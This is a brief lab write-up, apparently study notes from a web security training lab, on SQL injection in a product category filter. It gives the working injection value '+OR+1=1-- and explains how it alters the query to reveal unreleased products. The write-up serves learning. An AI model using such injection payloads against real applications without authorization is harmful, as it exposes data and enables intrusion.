Lab 1: sqli in WHERE clause allowing retrieval of hidden data

Details:  This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1 

To-Do: To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased. 

Solution:
	
	Modify the category parameter, giving it the value '+OR+1=1-- [in the url or in burp suite]
	Submit the request, and verify that the response now contains additional items. 
	Query: SELECT * FROM products WHERE category = 'Gifts'+OR+1=1--' AND released = 1 
	Explanation: Here in query 1=1 gives true for all and "--" comment out rest of the portion [' AND released = 1 ].
